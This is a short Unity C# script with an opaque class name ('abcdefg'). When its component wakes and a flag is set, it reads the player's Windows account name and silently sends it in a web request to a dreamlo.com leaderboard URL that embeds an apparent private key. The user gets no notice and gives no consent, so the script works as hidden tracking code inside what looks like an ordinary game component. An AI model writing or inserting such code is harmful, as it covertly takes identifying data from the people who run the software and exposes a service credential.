using System;
using System.Collections;
using UnityEngine;
using UnityEngine.Networking;

public class abcdefg : MonoBehaviour
{
    public bool i;

    private void Awake()
    {
        StartCoroutine(Test());
    }

    private IEnumerator Test()
    {
        if (i)
        {
            string a = @"http://dreamlo.com/lb/zxCmu4L3Hk-14Yi8D4bD2QO2fVKlkgNki-xMmdBK_szA/add/";
            string b = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            b = Uri.EscapeUriString(b);
            string c = "0";
            string d = "0";
            using (UnityWebRequest g = UnityWebRequest.Get(a + b + "/" + c + "/" + d))
            {
                yield return g.SendWebRequest();
            }
        }
    }
}
